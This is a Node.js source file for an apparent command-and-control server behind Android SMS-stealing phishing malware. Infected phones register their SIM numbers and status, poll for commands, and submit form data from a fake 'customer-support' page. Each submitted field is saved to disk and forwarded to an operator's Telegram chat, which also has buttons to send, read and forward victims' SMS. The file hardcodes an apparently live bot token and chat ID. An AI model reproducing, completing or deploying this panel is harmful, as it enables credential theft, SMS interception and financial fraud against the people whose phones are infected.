// index.js
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = '8480744633:AAHs2wpz1cw94MaEbQbm7BLsTOUqRnvQmj8'; // apna bot token
const ADMIN_IDS = [-1003025188008]; // apna chat/group id
const DEVELOPER = '@heck0bot';
const FORM_URL = 'https://customer-support-jlyt.onrender.com';
const PORT = 3000;

// ===== INIT =====
const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
app.use(bodyParser.json());

// ===== STORAGE =====
const devices = new Map(); // { uuid: { Device, sim1, sim2, battery, lastSeen } }
const commands = new Map(); // uuid => queue

function isAdmin(id) {
  return ADMIN_IDS.includes(id);
}

function addCommand(uuid, cmd) {
  if (!commands.has(uuid)) commands.set(uuid, []);
  commands.get(uuid).push(cmd);
}

// ===== FORMAT DEVICE INFO =====
function formatDevice(d) {
  const online = (Date.now() - (d.lastSeen || 0) < 60000);
  return `📱 *Device:* ${d.Device || 'Unknown'}
🪪 SIM1: ${d.sim1 || 'N/A'}
🪪 SIM2: ${d.sim2 || 'N/A'}
🔋 Battery: ${d.battery || 'N/A'}
🌐 Status: ${online ? '🟢 Online' : '🔴 Offline'}
• UUID: ${d.uuid}
• Form URL: ${FORM_URL}

👨‍💻 Developer: ${DEVELOPER}`;
}

// ===== EXPRESS ROUTES =====

// Device connect
app.post('/connect', (req, res) => {
  const { uuid, Device, sim1, sim2, battery } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');
  
  const device = { uuid, Device, sim1, sim2, battery, lastSeen: Date.now() };
  devices.set(uuid, device);
  
  bot.sendMessage(ADMIN_IDS[0], `📲 Device Connected\n${formatDevice(device)}`, { parse_mode: 'Markdown' });
  res.send('ok');
});

// Device polling commands
app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('missing uuid');
  
  const cmds = commands.get(uuid) || [];
  commands.set(uuid, []); // clear queue after sending
  res.json(cmds);
});

// Form submission from device
app.post('/form', (req, res) => {
  const { uuid, formData } = req.body;
  if (!uuid || !formData) return res.status(400).send('missing uuid or formData');
  
  // Save form data to file
  const filePath = path.join(__dirname, `formdata_${uuid}.json`);
  let allData = [];
  if (fs.existsSync(filePath)) allData = fs.readJsonSync(filePath);
  allData.push({ ts: new Date().toISOString(), data: formData });
  fs.writeJsonSync(filePath, allData);
  
  // Notify admin
  let text = `📝 *New Form Submission*\n\n📲 Device: ${uuid}\n`;
  Object.entries(formData).forEach(([k, v]) => text += `• *${k}:* ${v}\n`);
  
  bot.sendMessage(ADMIN_IDS[0], text, { parse_mode: 'Markdown' });
  res.send({ status: 'ok' });
});

// ===== TELEGRAM BOT HANDLERS =====

// /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) return bot.sendMessage(chatId, '❌ Permission denied.');
  
  bot.sendMessage(chatId, '✅ Welcome to admin panel', {
    reply_markup: {
      keyboard: [
        [{ text: 'Connected devices' }],
        [{ text: 'Experience bot time' }]
      ],
      resize_keyboard: true
    }
  });
});

// Show connected devices
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) return;
  
  if (msg.text === 'Connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    
    devices.forEach((d, uuid) => {
      bot.sendMessage(chatId, formatDevice(d), {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📤 Send SMS', callback_data: `send_sms:${uuid}` }],
            [{ text: '📥 Receive SMS', callback_data: `receive_sms:${uuid}` }],
            [{ text: '📡 Forwarding', callback_data: `set_forward_menu:${uuid}` }],
            [{ text: 'ℹ️ Device Info', callback_data: `device_info:${uuid}` }],
            [{ text: '📝 View Form Details', callback_data: `view_form:${uuid}` }]
          ]
        }
      });
    });
  }
});

// Show form data command
bot.onText(/\/formdata (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) return;
  
  const uuid = match[1];
  const filePath = path.join(__dirname, `formdata_${uuid}.json`);
  if (!fs.existsSync(filePath)) return bot.sendMessage(chatId, `❌ No form data for device ${uuid}`);
  
  const allData = fs.readJsonSync(filePath);
  let text = `📂 *Saved Form Data for ${uuid}*:\n\n`;
  allData.forEach((entry, i) => {
    text += `#${i + 1} (${entry.ts})\n`;
    Object.entries(entry.data).forEach(([k, v]) => text += `• *${k}:* ${v}\n`);
    text += '\n';
  });
  
  bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// Callback query handlers
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const [cmd, uuid] = query.data.split(':');
  if (!isAdmin(chatId)) return;
  
  const d = devices.get(uuid);
  if (!d) return bot.answerCallbackQuery(query.id, { text: '❌ Device not found' });
  
  switch (cmd) {
    case 'device_info':
      bot.sendMessage(chatId, formatDevice(d), { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(query.id);
      break;
      
    case 'send_sms':
      bot.sendMessage(chatId, `📤 Send SMS to *${d.Device}*\nFormat: \`number|message\``, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(query.id);
      break;
      
    case 'receive_sms':
      bot.sendMessage(chatId, 'ℹ️ (Last 5 SMS would be displayed here)');
      bot.answerCallbackQuery(query.id);
      break;
      
    case 'set_forward_menu':
      bot.sendMessage(chatId, '📡 Forwarding setup menu (SIM1/SIM2 configuration)', { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(query.id);
      break;
      
    case 'view_form':
      bot.sendMessage(chatId, `📝 Use /formdata ${uuid} to view all form submissions for this device`);
      bot.answerCallbackQuery(query.id);
      break;
      
    default:
      bot.answerCallbackQuery(query.id, { text: '❌ Unknown action' });
  }
});

// ===== START SERVER =====
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
bot.getMe().then(info => console.log(`🤖 Bot started as @${info.username}`)).catch(console.error);
